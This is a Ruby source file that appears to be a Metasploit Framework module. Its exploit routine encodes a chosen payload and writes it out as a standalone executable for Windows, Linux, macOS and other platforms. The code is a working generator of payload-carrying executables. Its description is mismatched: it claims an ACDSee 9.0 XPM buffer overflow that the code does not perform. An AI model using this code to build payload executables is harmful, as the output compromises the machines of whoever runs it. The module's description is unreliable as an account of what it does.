##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'pp'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
        
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Payload creation within Metasploit',
			'Description'    => %q{
					This module exploits a buffer overflow in ACDSee 9.0.
					When viewing a malicious XPM file with the ACDSee product, 
					a remote attacker could overflow a buffer and execute 
					arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'sussurro',
			'Version'        => '$$',
                        'References'     =>  [ ],
                        'Payload'        =>
                                {
                                        'Space'       => 100000,
                                        'BadChars'    => '',
                                        'DisableNops' => true,
                                },
                        'Platform'       => [ 'win', 'linux', 'solaris', 'unix',
 'osx', 'bsd' ],
                        'Arch'           => ARCH_ALL,
                        'Targets'        => [ [ 'Wildcard Target', { } ] ],
			'DefaultTarget'  => 0))

	end

	def exploit

		buf = payload.encoded
		arch = payload.arch
		plat = payload.platform.platforms

		exe  = Msf::Util::EXE.to_executable(payload.framework, arch, plat, buf)
		file_create(exe)
	end

end

